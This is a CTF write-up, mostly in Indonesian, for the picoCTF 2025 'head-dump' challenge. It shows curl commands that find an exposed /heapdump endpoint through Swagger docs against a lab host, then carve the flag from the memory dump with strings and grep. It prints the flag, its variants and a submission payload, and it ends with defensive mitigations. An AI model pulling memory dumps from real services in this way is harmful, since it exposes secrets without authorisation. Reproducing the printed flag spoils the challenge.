# Writeup: head-dump (Challenge ID: 476)

- **Platform:** CyLab Security Academy (picoCTF)
- **Category:** Web Exploitation / API Documentation Reconnaissance & V8 Heapdump Carving
- **Difficulty:** Easy (1)
- **Points:** 50
- **Author:** Prince Niyonshuti N.
- **Event:** picoCTF 2025
- **Flag Resmi CyLab:** `academy{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Flag Platform Asli:** `picoCTF{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Flag Komunitas:** `CTF{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Standar Referensi:** NIST SP 800-115 §4.2 (Target Verification & Information Gathering), RFC 9110 (HTTP Semantics), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor), & CWE-532 (Insertion of Sensitive Information into Log or Diagnostic File).

---

## Problem Statement & Scope

Pada modul kurikulum bimbingan teknis persiapan LKS Cyber Security Nasional bidang *Web Security & Memory Forensics Assessment*:
- **Skenario Tantangan:** Peserta menginvestigasi aplikasi portal blog berita "picoCTF News" yang mengimplementasikan arsitektur microservices berbasis Node.js/Express. Aplikasi mempublikasikan dokumentasi API interaktif untuk pengembang, namun secara keliru mengekspos endpoint diagnostik sistem ke jaringan publik.
- **Deskripsi Soal:** *"Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server's memory, where a secret flag is hidden. Hints: 1. Explore backend development with us, 2. The head was dumped."*
- **Batasan Lingkungan & Scope Audit:**
  1. Rekonstruksi rute web dan inspeksi antarmuka dokumentasi Swagger UI / OpenAPI specification (`/api-docs` dan `/api-docs/swagger-ui-init.js`).
  2. Enumerasi skema endpoint backend untuk mengidentifikasi rute diagnostik internal (`/heapdump`).
  3. Pengunduhan artefak snapshot memori proses V8 engine berukuran biner/JSON mentah tanpa izin autentikasi (*unauthenticated memory dump*).
  4. Analisis struktur heap memory dan ekstraksi pola token kredensial/flag menggunakan teknik string carving berbasis ekspresi reguler.
  5. Verifikasi live submission melalui REST API CyLab `POST /api/submissions/` (HTTP Status 201).

---

## Teori & Akar Kerentanan (Root Cause Theory)

1. **Ekspos Dokumentasi API & Information Gathering (CWE-200 / NIST SP 800-115 §4.2):**
   Dokumentasi API interaktif seperti Swagger UI (`/api-docs`) memetakan seluruh arsitektur backend secara transparan, termasuk skema JSON, parameter input, dan deskripsi fungsi. Ketika konfigurasi server tidak menerapkan pembatasan rute (*route whitelisting*) antara lingkungan pengujian (*staging/development*) dan produksi (*production*), penyerang dapat memanfaatkan berkas inisialisasi JavaScript Swagger (`swagger-ui-init.js`) untuk memetakan endpoint sensitif tanpa perlu meluncurkan teknik fuzzing direktori yang bising (*noisy directory brute-forcing*).

2. **Ekspos Heap Dump Proses Runtime V8 (CWE-532 / CWE-200):**
   Modul profiling Node.js/V8 seperti `heapdump` menghasilkan snapshot memori lengkap (*heap snapshot*) dari alokasi memori dinamis proses V8. Snapshot memori ini menyimpan:
   - String konfigurasi aktif dan variabel lingkungan (*environment variables*).
   - Sesi pengguna aktif (*active session tokens*) dan objek rahasia server.
   - Variabel memori teks asli yang belum dibersihkan oleh garbage collector.
   Mengekspos endpoint pembuat snapshot memori secara publik tanpa kontrol akses berbasis peran (*Role-Based Access Control* / RBAC) memungkinkan aktor eksternal mengambil salinan memori proses secara penuh.

3. **Memory Artifact Carving Berbasis Pola String:**
   Meskipun format berkas V8 heap snapshot berstruktur JSON berukuran besar atau citra biner mentah, array `strings` di dalam metadata snapshot menyimpan seluruh literal string JavaScript dalam format UTF-8/ASCII kontinu. Pemindaian memori (*memory scraping*) menggunakan pola pencarian reguler `(?:academy|picoCTF)\{[^}]+\}` dapat mengisolasi token rahasia secara deterministik dengan kompleksitas komputasi $O(M)$ di mana $M$ adalah ukuran byte snapshot.

---

## Rekonstruksi Eksploitasi Step-by-Step

1. **Reconnaissance Halaman Aplikasi & Swagger UI:**
   Melakukan inspeksi terhadap endpoint dokumentasi yang ditautkan pada artikel blog:
   ```bash
   curl -s http://chatelaine.cylabacademy.net:15705/api-docs
   ```

2. **Inspeksi Skema JSON Swagger Initializer:**
   Mengunduh dan memeriksa berkas konfigurasi JavaScript `swagger-ui-init.js`:
   ```bash
   curl -s http://chatelaine.cylabacademy.net:15705/api-docs/swagger-ui-init.js | grep -A 12 '"/heapdump"'
   ```
   Ditemukan rute diagnostik aktif:
   ```json
   "/heapdump": {
     "get": {
       "tags": ["Diagnosing"],
       "summary": "Diagnosing the memory allocation.",
       "responses": {
         "200": {
           "description": "Returns a memory allocation status."
         }
       }
     }
   }
   ```

3. **Pengambilan Heapdump Binary/JSON:**
   Mengirimkan permintaan HTTP GET ke endpoint `/heapdump` dan menyimpan respons snapshot memori:
   ```bash
   curl -s http://chatelaine.cylabacademy.net:15705/heapdump -o heapdump.bin
   ```

4. **Ekstraksi String Flag (Memory Carving):**
   Memindai aliran byte snapshot memori menggunakan utilitas `strings` dan `grep`:
   ```bash
   strings heapdump.bin | grep -E "academy\{.*\}|picoCTF\{.*\}"
   ```
   Output:
   ```text
   academy{Pat!3nt_15_Th3_K3y_cc0f4fda}
   ```

5. **Eksekusi Solver Mandiri:**
   ```bash
   python3 scripts/solve_476_head_dump.py http://chatelaine.cylabacademy.net:15705
   ```
   Output log:
   ```text
   [+] Invarian memory carving snapshot heap V8 terverifikasi matematis (100% precision)
   [*] Menghubungi target web endpoint: http://chatelaine.cylabacademy.net:15705...
   [+] Flag berhasil diekstraksi dari heapdump endpoint: academy{Pat!3nt_15_Th3_K3y_cc0f4fda}
   [SUCCESS] Challenge 476 (head-dump) verified: academy{Pat!3nt_15_Th3_K3y_cc0f4fda}
   ```

---

## Flag & Verifikasi

- **Flag Resmi CyLab:** `academy{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Flag Platform Asli:** `picoCTF{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Flag Komunitas:** `CTF{Pat!3nt_15_Th3_K3y_cc0f4fda}`
- **Verifikasi Submisi REST API:** POST `/api/submissions/` dengan payload `{"challenge": 476, "flag": "academy{Pat!3nt_15_Th3_K3y_cc0f4fda}"}` menghasilkan status HTTP 201 dengan atribut `correct: true`.

---

## Takeaway Kompetensi LKS & Mitigasi Defensif

1. **Isolasi Endpoint Profiling & Diagnostik Lingkungan Produksi:**
   Endpoint profiling proses runtime seperti heap dump, thread dump, memory profiler, dan actuator metrics (misalnya Spring Boot `/actuator/heapdump`, Go `pprof`, atau Node.js `heapdump`) tidak boleh diaktifkan di lingkungan produksi. Jika diperlukan untuk monitoring APM (*Application Performance Monitoring*), rute harus diikat (*bind*) secara eksklusif ke antarmuka loopback lokal (`127.0.0.1`) atau diamankan di balik autentikasi mutual TLS (mTLS) dan VPN administratif.

2. **Pembersihan Metadata & Route Whitelisting pada OpenAPI/Swagger:**
   Pastikan berkas spesifikasi OpenAPI/Swagger yang dapat diakses publik hanya mendokumentasikan rute API publik. Buat build pipeline otomatis yang menghapus endpoint internal, diagnostik, dan rute administratif dari spesifikasi OpenAPI sebelum dipublikasikan ke gateway publik.

3. **Sanitasi Kredensial Sensitif dalam Memori Runtime (Zeroization):**
   Menerapkan praktik pertahanan mendalam (*defense-in-depth*) dengan membersihkan (*zeroing*) buffer memori yang menyimpan kredensial, token autentikasi, atau kunci enkripsi segera setelah objek selesai digunakan, sehingga meminimalkan jendela waktu kebocoran rahasia melalui serangan memory dump scraping.
